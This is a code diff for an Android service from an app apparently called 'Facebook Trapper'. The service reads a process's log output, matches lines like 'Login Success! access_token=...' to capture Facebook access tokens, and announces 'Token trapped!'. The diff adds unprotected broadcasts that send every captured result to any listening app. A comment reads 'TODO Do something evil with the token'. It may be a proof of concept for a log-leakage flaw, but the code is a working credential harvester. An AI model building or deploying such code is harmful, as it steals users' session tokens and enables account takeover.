@@ -11,28 +11,37 @@ import android.app.Notification;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.net.Uri;
 import android.os.IBinder;
 import android.util.Log;
-import android.widget.ArrayAdapter;
-import android.widget.ListView;
 
-public class TrapperService extends Service {
+public class LogService extends Service {
 
-	private static TrapperService mInstance;
+	public static final String SERVICE_QUERY = "com.pixplicity.example.SERVICE_QUERY";
+	public static final String SERVICE_RESPONSE = "com.pixplicity.example.SERVICE_RESPONSE";
+	public static final String TRAPPER_RESPONSE = "com.pixplicity.example.TRAPPER_RESPONSE";
 
 	private static Thread mThread;
-	private TrapperActivity mActivity;
 
-	private final ArrayList<TrapperResult> mTokens = new ArrayList<TrapperResult>();
+	private final ArrayList<TrapperResult> mResults = new ArrayList<TrapperResult>();
+	private QueryReceiver mReceiver;
 
-	public static TrapperService getInstance(TrapperActivity activity) {
-		if (mInstance != null) {
-			mInstance.setActivity(activity);
+	private class QueryReceiver extends BroadcastReceiver {
+		@Override
+		public void onReceive(Context context, Intent intent) {
+			// Respond to the query
+			sendResponse(mThread != null && mThread.isAlive());
+			// Send all results
+			synchronized (mResults) {
+				for (int i = 0; i < mResults.size(); i++) {
+					sendResult(mResults.get(i));
+				}
+			}
 		}
-		return mInstance;
 	}
 
 	@Override
@@ -42,15 +51,17 @@ public class TrapperService extends Service {
 
 	@Override
 	public void onCreate() {
-		Log.i(TrapperActivity.TAG, "starting service");
 		// The service is first created
+		Log.i(LogActivity.TAG, "starting service");
+		// Listen to queries to the service
+		mReceiver = new QueryReceiver();
+		registerReceiver(mReceiver, new IntentFilter(SERVICE_QUERY));
 		int id = 0;
 		startForeground(id, showNotification(id, "Facebook Trapper running"));
 		if (mThread == null || !mThread.isAlive()) {
 			mThread = new Thread() {
 				int count = 0;
-				Pattern pattern =
-						Pattern.compile("Login Success! access_token=([^&\\s]+)");
+				Pattern pattern = Pattern.compile(TrapperResult.getRegEx());
 
 				@Override
 				public void run() {
@@ -63,8 +74,15 @@ public class TrapperService extends Service {
 						reader = new BufferedReader(new InputStreamReader(
 								process.getInputStream()),
 								1024);
+						boolean firstLine = true;
 						while (!isInterrupted()) {
 							final String line = reader.readLine();
+							if (firstLine) {
+								// The process started; indicate that the
+								// service is ready
+								sendResponse(true);
+								firstLine = false;
+							}
 							if (line == null) {
 								break;
 							}
@@ -73,7 +91,7 @@ public class TrapperService extends Service {
 							Thread.sleep(10);
 						}
 					} catch (IOException e) {
-						Log.e(TrapperActivity.TAG, e.getMessage());
+						Log.e(LogActivity.TAG, e.getMessage());
 						// Something went wrong; abort
 					} catch (InterruptedException e) {
 						// Stop thread
@@ -88,31 +106,39 @@ public class TrapperService extends Service {
 							}
 						}
 					}
-					Log.i(TrapperActivity.TAG, "service stopped");
+					Log.i(LogActivity.TAG, "service stopped");
 					showNotification(-1, "Facebook Trapper stopped");
+					stopSelf();
 				}
 
 				public void handleLine(final String line) {
 					Matcher match = pattern.matcher(line);
 					if (match.find()) {
-						String token = match.group(1);
-						TrapperResult result = new TrapperResult(line, token);
+						String interest = null;
+						if (match.groupCount() > 1) {
+							interest = match.group(1);
+						}
+						TrapperResult result = new TrapperResult(line, interest);
 						if (result.interest != null) {
 							showNotification(++count, "Token trapped!", result);
-							Log.i(TrapperActivity.TAG, "token trapped");
+							Log.d(LogActivity.TAG, "found match");
 						}
-						synchronized (mTokens) {
-							mTokens.add(result);
+						synchronized (mResults) {
+							mResults.add(result);
+							// Prune the list
+							for (int i = 0; i < Math.max(0, mResults.size()
+									- LogActivity.MAX_ITEMS); i++) {
+								mResults.remove(0);
+							}
 						}
 						// TODO Do something evil with the token
 						// Update the list
-						updateActivity();
+						sendResult(result);
 					}
 				};
 			};
 			mThread.start();
 		}
-		mInstance = this;
 	}
 
 	@Override
@@ -122,40 +148,17 @@ public class TrapperService extends Service {
 	}
 
 	public void stop() {
-		Log.i(TrapperActivity.TAG, "stopping service");
+		Log.i(LogActivity.TAG, "stopping service");
 		mThread.interrupt();
 		stopForeground(true);
+		unregisterReceiver(mReceiver);
+		sendResponse(false);
+		stopSelf();
 	}
 
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		return super.onStartCommand(intent, flags, startId);
-	}
-
-	public void setActivity(TrapperActivity activity) {
-		mActivity = activity;
-		updateActivity();
-	}
-
-	protected void updateActivity() {
-		if (mActivity != null) {
-			final ListView list = mActivity.getList();
-			list.post(new Runnable() {
-				@Override
-				public void run() {
-					ArrayAdapter<TrapperResult> adapter =
-							(ArrayAdapter<TrapperResult>) list.getAdapter();
-					adapter.clear();
-					synchronized (mTokens) {
-						for (int i = Math.max(0, mTokens.size()
-								- TrapperActivity.MAX_ITEMS); i < mTokens
-								.size(); i++) {
-							adapter.add(mTokens.get(i));
-						}
-					}
-				}
-			});
-		}
 	}
 
 	protected Notification showNotification(int id, String title) {
@@ -175,7 +178,7 @@ public class TrapperService extends Service {
 		}
 		final Intent intent;
 		if (id == 0) {
-			intent = new Intent(this, TrapperActivity.class);
+			intent = new Intent(this, LogActivity.class);
 			notification.flags |= Notification.FLAG_ONGOING_EVENT;
 			notification.icon = R.drawable.ic_service;
 		} else {
@@ -195,8 +198,16 @@ public class TrapperService extends Service {
 		return notification;
 	}
 
-	public boolean isAlive() {
-		return mThread != null && mThread.isAlive();
+	private void sendResult(TrapperResult result) {
+		Intent intent = new Intent(TRAPPER_RESPONSE);
+		intent.putExtra("result", result);
+		sendBroadcast(intent);
+	}
+
+	private void sendResponse(boolean alive) {
+		Intent broadcast = new Intent(SERVICE_RESPONSE);
+		broadcast.putExtra("alive", alive);
+		sendBroadcast(broadcast);
 	}
 
 }
